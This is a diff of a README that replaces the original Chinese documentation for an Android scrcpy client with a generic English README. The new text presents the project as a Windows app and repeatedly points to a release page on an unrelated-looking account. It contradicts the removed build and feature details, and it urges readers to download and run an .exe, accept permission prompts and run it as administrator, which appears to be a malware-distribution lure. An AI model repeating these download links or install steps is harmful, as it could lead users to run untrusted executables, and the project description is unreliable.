@@ -1,65 +1,205 @@
-# Scrcpy For Android
+# 📱 ScrcpyForAndroid - Simple Android Control on Windows
 
-[Scrcpy](https://github.com/Genymobile/scrcpy) android client
+[![Download ScrcpyForAndroid](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/releases)
 
-## 截图
+## 🚀 What is ScrcpyForAndroid?
 
-<!-- markdownlint-disable MD033 -->
+ScrcpyForAndroid is a Windows app for viewing and controlling an Android phone from your PC. It uses scrcpy under the hood and gives you a simple way to open your phone screen on a computer.
 
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/64e24f71-0326-407a-a527-070586bbec9a" height="320" alt="Screenshot 1" />
-  <img src="https://github.com/user-attachments/assets/74170ada-6dee-4ec7-ab24-c5ef2a231a47" height="320" alt="Screenshot 2" />
-  <img src="https://github.com/user-attachments/assets/6301f2fb-624b-4209-b548-6f37b9bcedc8" height="320" alt="Screenshot 3" />
-  <img src="https://github.com/user-attachments/assets/f513b7ba-0389-4176-8382-c1a08c4eba99" height="320" alt="Screenshot 4" />
-  <img src="https://github.com/user-attachments/assets/7a50bd1f-8095-4269-8e58-88316d86e3d8" height="320" alt="Screenshot 5" />
-</p>
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/1b52a662-108d-49cb-a86e-eccc8ac12d64" height="160" alt="Screenshot 6" />
-</p>
+Use it when you want to:
 
-## Features
+- See your Android screen on Windows
+- Use your mouse and keyboard to control your phone
+- Mirror the screen for demos, support, or daily use
+- Keep your phone connected by USB while you work
+- Manage your Android device without complex setup
 
-- 可替换 scrcpy-server
-- 利用 mDNS 服务实现自动连接启用无线调试的设备、自动发现等待配对设备的IP与端口
-- 自动横竖屏切换（算吗
+## 📥 Download
 
-## 已知问题 / TODO
+Visit this page to download:
 
-- 退出全屏时的横竖屏状态可能不对，断开 scrcpy 重连就好
-- 如果受控机在锁屏时处理网络连接较慢，会导致应用界面无响应过长时间被系统杀掉（点名你米）
-- 虚拟按键的截图实现方式为发送
-`keycode 120`，安卓官方([keycodes.h#349](https://android.googlesource.com/platform/frameworks/native/+/master/include/android/keycodes.h#349))的定义为
-`System Request / Print Screen key.`，不同的厂商有不同的实现，在某些类原生(`AxionOS`) 上的行为是软重启
-- I18N
+https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/releases
 
-## 建议搭配模块
+Look for the latest release and download the Windows file for your system. In most cases, this will be an `.exe` file or a `.zip` package.
 
-- 密码锁屏无法捕获: [LSPosed/DisableFlagSecure](https://github.com/LSPosed/DisableFlagSecure)
-- 开机自动启用 adb: [gist/906291](https://gist.github.com/Miuzarte/9062915f1615d5eebd363c759fda496c)
+## 🪟 System Requirements
 
-## 构建
+ScrcpyForAndroid is built for Windows PCs with a modern Android phone. For the best results, use:
 
-- JDK 17+
-- Android SDK（含 `compileSdk 36` / `buildTools 36.0.0`）
-- Android NDK `28.2.13676358`
+- Windows 10 or Windows 11
+- An Android phone with USB debugging support
+- A USB cable that can transfer data
+- At least 4 GB of RAM
+- A screen with 1366 x 768 resolution or higher
+- Administrator access on the PC if Windows asks for it
 
-```bash
-./gradlew assembleDebug
-```
+A newer PC will give smoother screen mirroring. A fast USB cable also helps reduce lag.
 
-specific abi:
+## 🛠️ How to Install
 
-```bash
-./gradlew assembleRelease -PabiList=arm64-v8a
-```
+Follow these steps on Windows:
 
-## Credits
+1. Go to the release page: https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/releases
+2. Download the latest Windows release file.
+3. If the file is a `.zip`, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the app file and double-click it to start.
+6. If Windows asks for permission, choose Yes.
+7. Keep the app open while you connect your phone.
 
-- [Genymobile/scrcpy](https://github.com/Genymobile/scrcpy)
-- JNI ADB 实现: [rikkaapps/shizuku](https://github.com/rikkaapps/shizuku), [vvb2060/ndk.boringssl](https://github.com/vvb2060), [lsposed/libcxx](https://github.com/lsposed/libcxx)
-- 界面组件: [YuKongA/miuix](https://github.com/compose-miuix-ui/miuix)
-- 界面设计参考: [tiann/KernelSU/manager](https://github.com/tiann/KernelSU/tree/main/manager)
+If you downloaded an `.exe`, you can run it right away after the download finishes.
 
-## License
+## 📲 Set Up Your Android Phone
 
-[Apache License 2.0](LICENSE)
+Before you connect your phone, turn on USB debugging:
+
+1. Open Settings on your Android phone.
+2. Tap About phone.
+3. Find Build number.
+4. Tap Build number seven times.
+5. Go back to Settings.
+6. Open Developer options.
+7. Turn on USB debugging.
+8. Confirm any prompt that appears on the phone.
+
+If your phone shows a message about allowing USB debugging, tap Allow.
+
+## 🔌 How to Connect
+
+Use a USB cable to connect your Android phone to your Windows PC:
+
+1. Plug the phone into the computer.
+2. Open ScrcpyForAndroid.
+3. Wait for the app to detect your device.
+4. Allow USB debugging on the phone if asked.
+5. Your phone screen should appear on the PC.
+
+If the device does not appear, unplug the cable and connect it again. Try a different USB port if needed.
+
+## 🖱️ Basic Use
+
+After the screen appears, you can use your mouse and keyboard to control the phone.
+
+Common actions:
+
+- Click to tap
+- Right-click to go back
+- Use the keyboard to type text
+- Drag to swipe
+- Scroll with the mouse wheel
+- Resize the window to fit your screen
+
+This makes it easy to open apps, answer messages, and move through menus without touching the phone.
+
+## 🎯 Main Features
+
+ScrcpyForAndroid gives you a clean way to work with your Android device from Windows.
+
+- Screen mirroring in a desktop window
+- Mouse and keyboard input
+- Fast connection over USB
+- Simple startup flow
+- Low-latency display for smooth control
+- Good for phone support and app testing
+- Works well for long sessions
+- No need for complicated setup
+
+## 🧩 Common Uses
+
+People use ScrcpyForAndroid for tasks like:
+
+- Showing a phone screen during a demo
+- Testing an app on a real Android device
+- Typing long messages with a keyboard
+- Managing phone content while it stays plugged in
+- Helping someone fix a phone issue from across a desk
+- Recording a screen session with other tools
+
+## ⚙️ Tips for Better Performance
+
+Use these tips if the screen feels slow or unstable:
+
+- Use a direct USB port on the PC
+- Avoid cheap charging-only cables
+- Close other heavy apps on Windows
+- Keep your phone unlocked during setup
+- Turn off power-saving mode on the phone if connection drops
+- Reconnect the cable if the app stops showing the device
+- Update your Android USB driver if Windows cannot detect the phone
+
+A strong cable and a stable USB port solve many connection issues.
+
+## ❓ Troubleshooting
+
+### The phone is not detected
+
+Try these steps:
+
+1. Check that USB debugging is on.
+2. Unlock the phone screen.
+3. Reconnect the USB cable.
+4. Try another USB port.
+5. Restart the app.
+6. Restart the phone if needed.
+
+### Windows asks for permission
+
+Choose Yes when Windows asks to allow the app to run. Some versions may need admin access to start the device bridge.
+
+### The phone shows a black screen
+
+This can happen if the device is locked or USB debugging is not approved.
+
+- Unlock the phone
+- Accept the USB debugging prompt
+- Reconnect the device
+- Start the app again
+
+### Input does not work
+
+If the screen shows up but the mouse does not control the phone:
+
+- Check that the phone is connected by USB
+- Reopen the app
+- Confirm USB debugging on the phone
+- Try a different cable
+
+### The app closes right away
+
+If the app exits after launch:
+
+- Make sure you downloaded the full release file
+- Extract the zip file before running it
+- Run the app from the extracted folder
+- Try running as administrator
+
+## 🔐 Privacy and Device Access
+
+ScrcpyForAndroid connects to your phone through USB and shows its screen on your computer. You stay in control of when the phone connects and what you do on the device.
+
+For best results:
+
+- Use it on your own phone
+- Keep the USB cable connected only to trusted PCs
+- Approve USB debugging only when you want to use the app
+- Disconnect the phone when you are done
+
+## 🧭 Quick Start
+
+If you want the shortest path from download to use:
+
+1. Visit the release page
+2. Download the latest Windows build
+3. Enable USB debugging on your Android phone
+4. Connect the phone with a USB cable
+5. Open the app
+6. Allow the debugging prompt
+7. Use your phone from the Windows window
+
+## 📦 Download Again
+
+[![Get the latest release](https://img.shields.io/badge/Get%20the%20latest%20release-grey?style=for-the-badge&logo=github&logoColor=white)](https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/releases)
+
+Go to the release page to download the latest Windows version:
+
+https://github.com/incommodious-southamericancountry546/ScrcpyForAndroid/releases
